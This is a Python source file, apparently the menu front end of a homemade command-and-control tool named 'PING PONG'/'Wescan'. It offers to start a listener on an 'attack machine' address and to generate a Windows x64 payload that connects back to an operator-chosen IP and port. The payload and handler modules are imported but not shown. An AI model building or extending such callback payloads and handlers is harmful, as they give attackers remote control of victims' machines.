# -*- coding:utf-8 -*-
# @FileName  :main.py
# @Time      :2022/11/07 20:27:59
# @Author    :D0WE1L1N\
import handler
import payload.payload_packer
def print_main():
    print(
        '''
(    (        )             (        )      )            ____ 
)\ ) )\ )  ( /(  (          )\ )  ( /(   ( /(  (        |   / 
(()/((()/(  )\()) )\ )      (()/(  )\())  )\()) )\ )     |  /  
/(_))/(_))((_)\ (()/(       /(_))((_)\  ((_)\ (()/(     | /   
(_)) (_))   _((_) /(_))_    (_))    ((_)  _((_) /(_))_   |/    
| _ \|_ _| | \| |(_)) __|   | _ \  / _ \ | \| |(_)) __| (      
|  _/ | |  | .` |  | (_ |   |  _/ | (_) || .` |  | (_ | )\     
|_|  |___| |_|\_|   \___|   |_|    \___/ |_|\_|   \___|((_)    
                                                            

========================WELCOME !!========================
====================Wescan   V0.0.3.1 ====================
====================Aurthor : D0WE1L1N====================                                                                                                                
    ''')
    main()
def sub_main():
    choice = input("choose your choice>")
    if choice == "1":
       startserver()
    if choice == "2":
        print("type of payload:")
        print("1) PINGPONG windows x64")
        type = input("choose your choice>")
        if type == "1":
            ip = input("payload>[*]Please input the ip of your host(blank for 127.0.0.1)>")
            port = input("payload>[*]Please input the port(blank for 624)>")
            if port == "":
                port = 624
            if ip == "":
                ip = "127.0.0.1"
            else:
                try:
                    port = int(port)
                except:
                    print("handler>[-]port input error")
            payload.payload_packer.pack("PINGPONG_payload", ip, port)
    if choice == "PING":
        print("PONG")
        sub_main()
    elif choice == "exit":
        print("exiting......")
    else:
        print("error:no such choice")
        main()
def main():
    print("Active choice:")
    print("1) Start a PINGPONG handler")
    print("2) Make payload(s)")
    # print("3) Settings")
    sub_main()
def startserver():
    ip = input("handler>[*]Please input the IP for the attack machine(blank for 127.0.0.1)>")
    port = input("handler>[*]Please input the PORT(blank for 624)>")
    handler.startserver(ip, port, True, False)
if __name__ == "__main__":
    print_main()
